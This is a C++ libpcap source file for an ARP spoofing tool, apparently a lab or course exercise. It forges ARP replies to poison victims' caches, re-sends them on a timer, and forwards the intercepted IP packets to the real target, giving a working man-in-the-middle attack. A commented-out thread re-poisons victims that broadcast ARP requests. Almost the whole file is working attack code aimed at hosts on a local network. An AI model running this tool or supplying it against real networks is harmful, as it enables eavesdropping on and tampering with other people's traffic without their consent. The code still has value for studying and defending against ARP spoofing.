#include "arpfunc.h"

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void makeArpPacket(EthArpPacket* packet, Mac eth_dmac, Mac eth_smac, Mac arp_tmac, Mac arp_smac, Ip arp_sip, Ip arp_tip, int flag)
{
	packet->eth_.dmac_ = eth_dmac;
	packet->eth_.smac_ = eth_smac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(flag == rep)
		packet->arp_.op_ = htons(ArpHdr::Reply);
	else
		packet->arp_.op_ = htons(ArpHdr::Request);
	packet->arp_.smac_ = arp_smac;
	packet->arp_.sip_ = htonl(arp_sip);
	packet->arp_.tmac_ = arp_tmac;
	packet->arp_.tip_ = htonl(arp_tip);
}

Mac getotherMac(pcap_t* handle, Ip tarip)
{
	EthArpPacket newpacket;
	Mac mac;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 0;
		}
        memcpy(&newpacket, packet, sizeof(EthArpPacket));
        if(newpacket.eth_.type() == EthHdr::Arp && newpacket.arp_.pro() == EthHdr::Ip4)
		{
			if(newpacket.arp_.op() == ArpHdr::Reply && tarip == newpacket.arp_.sip())
			{
				mac = newpacket.eth_.smac();
				break;
			}
		}
	}
	return mac;
}

void send_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow)
{
	int res;
	char errbuf[PCAP_ERRBUF_SIZE];
    EthArpPacket packet;
    while(1)
    {
		printf("Send: sending packet for keep connection...\n");
        for(int i =0;i<flow;i++)
        {
            makeArpPacket(&packet, victim[i].sender_mac, attacker->mac, victim[i].sender_mac, attacker->mac, victim[i].target_ip, victim[i].sender_ip, rep);
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		    if (res != 0) {
			    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		    }
        }
        sleep(20);
    }
}

void release_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow)
{
	int res;
	EthIpPacket newpacket;
	char errbuf[PCAP_ERRBUF_SIZE];
    while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}
		memcpy(&newpacket, packet, sizeof(EthIpPacket));
		for(int i =0;i<flow;i++)
		{
			if(newpacket.eth_.type() == EthHdr::Ip4 && newpacket.ipv4_.ipdst() == victim[i].target_ip && newpacket.ipv4_.ipsrc() == victim[i].sender_ip)
			{
				printf("Release: %x to %x\n", uint32_t(newpacket.ipv4_.ipsrc()), uint32_t(newpacket.ipv4_.ipdst()));
				printf("Release: send all packet from target and sender\n");
				int size = sizeof(EthHdr) + newpacket.ipv4_.iplen();
				u_char* fakepacket = new u_char[sizeof(u_char)*size];

				newpacket.eth_.smac_ = attacker->mac;
				newpacket.eth_.dmac_ = victim[i].target_mac;
				
				memcpy(fakepacket, packet, size);
				memcpy(fakepacket, &newpacket, sizeof(EthIpPacket));

				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(fakepacket), size);
				if (res != 0)
				{
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
				delete[] fakepacket;
			}
		}
	}
}

/*
void catch_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow)
{
	int res;
	int flag = 0;
	EthArpPacket newpacket;
	EthArpPacket fakepacket;
	char errbuf[PCAP_ERRBUF_SIZE];
    while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			exit(-1);
		}
		memcpy(&newpacket, packet, sizeof(EthArpPacket));
        if(newpacket.eth_.type() == EthHdr::Arp && newpacket.arp_.pro() == EthHdr::Ip4)
		{
			if((newpacket.arp_.tmac()).isBroadcast())
			{
				printf("Catch: FIND Broadcast!! Is it victim?\n");
				for(int i = 0;i<flow;i++)
				{
					if(victim[i].sender_ip == newpacket.arp_.sip())
					{
						printf("Catch: Victim...Attack start!!\n");
						makeArpPacket(&fakepacket, victim[i].sender_mac, attacker->mac, victim[i].sender_mac, attacker->mac, attacker->ip, victim[i].sender_ip, rep);
						res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fakepacket), sizeof(EthArpPacket));
						if (res != 0) {
							fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
						}
						break;
					}
				}
			}
		}
	}
}
*/